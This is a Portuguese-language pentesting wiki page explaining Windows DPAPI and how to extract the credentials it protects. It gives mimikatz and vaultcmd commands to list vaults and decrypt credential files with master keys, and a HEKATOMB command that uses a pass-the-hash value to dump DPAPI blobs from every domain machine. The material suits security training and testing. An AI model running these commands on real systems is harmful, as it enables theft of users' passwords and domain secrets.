# DPAPI - Extraindo Senhas

{{#include ../../banners/hacktricks-training.md}}



## O que é DPAPI

A Data Protection API (DPAPI) é utilizada principalmente dentro do sistema operacional Windows para a **criptografia simétrica de chaves privadas assimétricas**, aproveitando segredos de usuário ou do sistema como uma fonte significativa de entropia. Essa abordagem simplifica a criptografia para os desenvolvedores, permitindo que eles criptografem dados usando uma chave derivada dos segredos de logon do usuário ou, para criptografia do sistema, os segredos de autenticação do domínio do sistema, eliminando assim a necessidade de os desenvolvedores gerenciarem a proteção da chave de criptografia por conta própria.

### Dados Protegidos pelo DPAPI

Entre os dados pessoais protegidos pelo DPAPI estão:

- Senhas e dados de preenchimento automático do Internet Explorer e Google Chrome
- Senhas de e-mail e contas FTP internas para aplicativos como Outlook e Windows Mail
- Senhas para pastas compartilhadas, recursos, redes sem fio e Windows Vault, incluindo chaves de criptografia
- Senhas para conexões de área de trabalho remota, .NET Passport e chaves privadas para vários propósitos de criptografia e autenticação
- Senhas de rede gerenciadas pelo Credential Manager e dados pessoais em aplicativos que utilizam CryptProtectData, como Skype, MSN messenger e mais

## Lista Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Arquivos de Credenciais

Os **arquivos de credenciais protegidos** podem estar localizados em:
```
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Obtenha informações de credenciais usando mimikatz `dpapi::cred`, na resposta você pode encontrar informações interessantes, como os dados criptografados e o guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
Você pode usar o **mimikatz module** `dpapi::cred` com o `/masterkey` apropriado para descriptografar:
```
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
```
## Master Keys

As chaves DPAPI usadas para criptografar as chaves RSA do usuário são armazenadas no diretório `%APPDATA%\Microsoft\Protect\{SID}`, onde {SID} é o [**Identificador de Segurança**](https://en.wikipedia.org/wiki/Security_Identifier) **desse usuário**. **A chave DPAPI é armazenada no mesmo arquivo que a chave mestra que protege as chaves privadas dos usuários**. Geralmente, são 64 bytes de dados aleatórios. (Observe que este diretório é protegido, então você não pode listá-lo usando `dir` no cmd, mas pode listá-lo a partir do PS).
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Isto é como um conjunto de Chaves Mestras de um usuário se parecerá:

![](<../../images/image (1121).png>)

Normalmente, **cada chave mestra é uma chave simétrica criptografada que pode descriptografar outro conteúdo**. Portanto, **extrair** a **Chave Mestra criptografada** é interessante para **descriptografar** posteriormente aquele **outro conteúdo** criptografado com ela.

### Extrair chave mestra e descriptografar

Verifique o post [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#extracting-dpapi-backup-keys-with-domain-admin) para um exemplo de como extrair a chave mestra e descriptografá-la.

## SharpDPAPI

[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI#sharpdpapi-1) é uma porta em C# de algumas funcionalidades do DPAPI do projeto [@gentilkiwi](https://twitter.com/gentilkiwi)'s [Mimikatz](https://github.com/gentilkiwi/mimikatz/).

## HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) é uma ferramenta que automatiza a extração de todos os usuários e computadores do diretório LDAP e a extração da chave de backup do controlador de domínio através de RPC. O script então resolverá todos os endereços IP dos computadores e realizará um smbclient em todos os computadores para recuperar todos os blobs DPAPI de todos os usuários e descriptografar tudo com a chave de backup do domínio.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Com a lista de computadores extraída do LDAP, você pode encontrar toda sub-rede mesmo que não soubesse delas!

"Porque os direitos de Administrador de Domínio não são suficientes. Hackeie todos."

## DonPAPI

[**DonPAPI**](https://github.com/login-securite/DonPAPI) pode despejar segredos protegidos pelo DPAPI automaticamente.

## Referências

- [https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)

{{#include ../../banners/hacktricks-training.md}}
